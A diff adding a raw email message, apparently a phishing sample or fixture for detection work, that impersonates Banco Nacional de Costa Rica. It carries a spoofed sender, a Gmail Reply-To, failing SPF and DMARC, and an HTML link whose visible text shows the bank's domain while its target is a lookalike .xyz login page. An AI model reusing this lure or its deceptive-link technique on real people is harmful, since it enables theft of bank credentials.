@@ -1,0 +1,33 @@
+Return-Path: <bounce-9941@promo-envios-rapidos.xyz>
+Delivered-To: analista@empresa-local.cr
+Received: from relay.promo-envios-rapidos.xyz (198.51.100.42)
+        by mx.empresa-local.cr with ESMTP id msg002
+        for <analista@empresa-local.cr>; Sat, 21 Nov 2026 11:30:12 -0600
+Authentication-Results: mx.empresa-local.cr;
+        spf=fail (domain of soporte@bncr.fi.cr does not designate 198.51.100.42);
+        dkim=none;
+        dmarc=fail (p=REJECT)
+From: "Alerta de Seguridad BN" <soporte@bncr.fi.cr>
+Reply-To: <verificacion-cuentas-cr@gmail.com>
+To: <analista@empresa-local.cr>
+Subject: Accion requerida: Intento de acceso no reconocido
+Date: Sat, 21 Nov 2026 11:30:05 -0600
+Message-ID: <88412209@promo-envios-rapidos.xyz>
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="----=_Boundary_Alt_002"
+
+------=_Boundary_Alt_002
+Content-Type: text/plain; charset="UTF-8"
+
+Detectamos un inicio de sesion sospechoso. Verifique su cuenta en https://www.bncr.fi.cr
+
+------=_Boundary_Alt_002
+Content-Type: text/html; charset="UTF-8"
+
+<html>
+  <body>
+    <p>Detectamos un inicio de sesion sospechoso desde otro pais.</p>
+    <p>Valide su identidad aqui: <a href="http://login-verificacion-segura.xyz/auth">https://www.bncr.fi.cr</a></p>
+  </body>
+</html>
+------=_Boundary_Alt_002--
